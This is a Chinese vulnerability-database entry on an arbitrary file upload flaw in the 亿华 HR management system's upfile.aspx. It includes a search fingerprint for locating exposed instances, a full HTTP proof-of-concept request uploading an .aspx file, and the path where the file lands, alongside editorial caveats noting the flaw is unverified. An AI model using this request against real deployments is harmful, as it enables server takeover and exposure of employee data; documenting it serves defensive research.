---
source: "wy876 漏洞文库"
title: "亿华人力资源管理系统 upfile.aspx任意后缀上传"
product: "亿华人力资源管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；WebForms VIEWSTATE/Session与ASPX解析"
prerequisites: "携带SessionId，身份状态未说明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xnk6usd7it2uhng6"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E5%8D%8E%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E4%BA%BF%E5%8D%8E%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fupfile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"亿华人力资源管理系统\""
id: "vw-66c773aab1d32ca346acb12c"
entity_id: "ve-66c773aab1d32ca346acb12c"
schema_version: "1"
---

# 亿华人力资源管理系统 upfile.aspx任意后缀上传

## 条目说明

- 对象与具体问题：亿华人力资源管理系统；upfile.aspx任意后缀上传
- 版本、配置及部署条件：版本未知；WebForms VIEWSTATE/Session与ASPX解析
- 认证与权限前提：携带SessionId，身份状态未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与203不同处理页及字段，不能仅同落盘目录合并
- 内容123非可执行验证；固定VIEWSTATE/GENERATOR不可泛化所有部署
- 给FilesUpload路径无响应，需区分上传成功和服务器执行
- 缺版本/修复；请求副作用为文件写入

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
亿华人力资源管理系统是一款全面的人力资源管理软件，旨在帮助企业实现员工档案管理规范化、薪资管理自动化、招聘管理流程化等目标。该系统涵盖了人力资源管理的各个方面，包括员工档案管理、薪资管理、招聘管理、培训管理、福利管理等。亿华人力资源管理系统upfile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 亿华人力资源管理系统

## 三、资产测绘
+ hunter`web.body="亿华人力资源管理系统"`
+ 特征


## 四、漏洞复现
```http
POST /FileManage/upfile.aspx HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------3243433393122674734542415452
Connection: close
Cookie: ASP.NET_SessionId=2**********************s
Upgrade-Insecure-Requests: 1

-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKMTEwMjM4NDkyMWRktbRwLggX8FeyROMxp865VQxNInwjdx6WjO4Wq+j8FUg=
-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

BD080F3A
-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="File"; filename="1.aspx"
Content-Type: image/png

123
-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="UploadButton"

开始上传
-----------------------------3243433393122674734542415452--

```

> 请求长度说明：原资料 Content-Length 为 659；静态长度已移除，应由客户端根据最终请求体的字节数生成。


上传文件位置

```plain
/FilesUpload/1.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xnk6usd7it2uhng6>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
